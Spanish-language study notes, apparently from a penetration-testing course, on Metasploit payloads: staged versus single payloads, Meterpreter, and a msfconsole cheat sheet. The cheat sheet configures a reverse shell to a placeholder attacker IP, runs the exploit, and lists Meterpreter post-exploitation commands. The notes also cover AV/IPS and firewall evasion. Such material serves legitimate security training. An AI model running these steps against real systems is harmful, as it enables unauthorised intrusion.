---
tags:
  - metasploit/payloads
  - msfvenom
---
## Conceptos Clave (TL;DR)

* Un payload se envía junto con el exploit para ejecutarse en el sistema operativo objetivo y, típicamente, devolver una conexión (shell) al atacante.

* **Singles:** Son payloads autocontenidos que incluyen el exploit y todo el shellcode en un solo bloque. Son más estables, pero pueden ser demasiado grandes para ser soportados por algunos exploits. Se identifican por no usar barras (ej. `windows/shell_bind_tcp`).

* **Stagers y Stages (Staged):** Proceso modularizado para evadir AV/IPS. El *Stager* es un código pequeño y confiable que se ejecuta primero en la víctima para inicializar la conexión hacia el atacante. Luego, descarga el *Stage*, que es el payload principal sin límites de tamaño (ej. Meterpreter, VNC). Se identifican por usar `/` (ej. `windows/shell/bind_tcp`).

* **Meterpreter:** Payload multifacético que utiliza inyección de DLL para residir completamente en la memoria del host remoto, sin dejar rastros en el disco, lo que dificulta la detección forense. Permite cargar y descargar scripts y plugins dinámicamente.

* Las conexiones inversas (*reverse*) son generalmente más efectivas porque la víctima inicia la conexión, aprovechando la confianza de los firewalls en el tráfico de salida y saltando el filtrado de entrada.

  
## Herramientas Clave

* **[Metasploit](../../📂%2008%20Herramientas&Cheatsheets/Metasploit.md):** Interfaz principal de Metasploit Framework utilizada para buscar, configurar y ejecutar exploits y payloads en el sistema objetivo.

* **msfvenom:** Herramienta independiente mencionada para la creación manual de payloads personalizados.
  

## Metodología Paso a Paso

1. **Búsqueda y filtrado:** Debido a la gran cantidad de payloads disponibles, usar el comando de búsqueda con filtros (`grep`) para encontrar rápidamente el payload adecuado según el sistema operativo, la arquitectura y el tipo de conexión deseada (ej. Meterpreter reverse TCP para Windows x64).

2. **Selección:** Una vez seleccionado el módulo de exploit, asignar el número de índice del payload deseado para vincularlo al ataque.

3. **Configuración:** Revisar las opciones del módulo y del payload. Definir obligatoriamente la IP atacante donde se recibirá la conexión y el puerto de escucha, además de los parámetros del objetivo.

4. **Ejecución y Post-Explotación:** Lanzar el exploit. Si es exitoso y se usa Meterpreter, se abrirá una sesión desde la cual se puede interactuar con el sistema operativo objetivo, extraer información o derivar a una shell nativa.

## Cheat Sheet de Comandos
```bash
# Listar todos los payloads disponibles en Metasploit
show payloads

  
# Filtrar la lista de payloads buscando un termino especifico (ej. meterpreter)
grep meterpreter show payloads

  
# Contar la cantidad de payloads que coinciden con un termino
grep -c meterpreter show payloads

  
# Encadenar busquedas grep para acotar resultados (ej. meterpreter + reverse_tcp)
grep meterpreter grep reverse_tcp show payloads

  
# Seleccionar un payload especifico utilizando su ID en la lista generada
set payload <PAYLOAD_ID>

  
# Mostrar las opciones requeridas tanto para el exploit como para el payload
show options

  
# Verificar la IP local del atacante directamente dentro de msfconsole
ifconfig

  
# Configurar la direccion IP del atacante (Listener)
set LHOST <ATTACKER_IP>

  
# Configurar el puerto de escucha en la maquina atacante
set LPORT <ATTACKER_PORT>

  
# Configurar la direccion IP de la victima
set RHOSTS <TARGET_IP>

  
# Ejecutar el exploit y el payload configurado
run
```
### Comandos útiles en sesión Meterpreter
```bash
# Ver menu de ayuda con todos los comandos de post-explotacion disponibles
help

  
# Obtener el usuario bajo el cual se esta ejecutando el payload (Reemplaza a whoami)
getuid

  
# Listar el contenido del directorio actual en la maquina victima
ls

  
# Cambiar de directorio en la maquina victima
cd <DIRECTORY_NAME>

  
# Hacer drop a la consola de comandos nativa de Windows (cmd.exe)
shell
```

## "Gotchas" y Troubleshooting

* **Límites de tamaño en Singles:** Algunos exploits fallarán al usar payloads de tipo Single (Inline) porque no soportan el gran tamaño del shellcode resultante; en estos casos, es obligatorio usar Staged payloads.

* **Comando `whoami` no soportado en Meterpreter:** El prompt de Meterpreter no es una línea de comandos de Windows. Para ver el usuario actual, se debe usar el equivalente de Linux: `getuid`.

* **Fallo de conexión por puerto:** Si el ataque falla y el payload no logra establecer la conexión inversa, verificar que el puerto definido en `LPORT` no esté ya en uso, cambiar el puerto y relanzar el ataque.

* **Interacción con el idioma del payload:** Al listar los payloads dentro de un módulo de exploit ya seleccionado, msfconsole detectará automáticamente el sistema operativo objetivo y solo mostrará los payloads compatibles con esa arquitectura/SO.